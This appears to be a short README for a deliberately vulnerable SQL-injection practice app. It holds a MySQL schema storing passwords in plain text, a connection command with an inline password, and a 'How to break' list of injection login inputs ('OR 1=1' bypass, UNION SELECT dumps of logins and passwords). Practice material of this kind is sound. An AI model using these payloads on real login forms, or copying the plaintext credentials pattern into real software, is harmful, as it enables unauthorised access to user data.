# BackDoorCode

Very stupid code only for data protection practise

# DB:

DROP DATABASE IF EXISTS test;

CREATE DATABASE test;

CREATE TABLE users (
   id INTEGER AUTO_INCREMENT,
   login varchar(255),
   pass varchar(255),
   data varchar(255),
   PRIMARY KEY(id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

INSERT INTO users VALUES(NULL,'login','pass','goto A');

to connect:
mysql -u user -h 46.37.146.33 -P 7306 -pqwerty123


# How to break:

    1) access to data:
        login: login' OR 1=1; #
        password: any
    2) access to users table:
        login: ' union select login from users order by 1 DESC; #
        or
        ' union select pass from users order by 1 DESC; #
        password: any
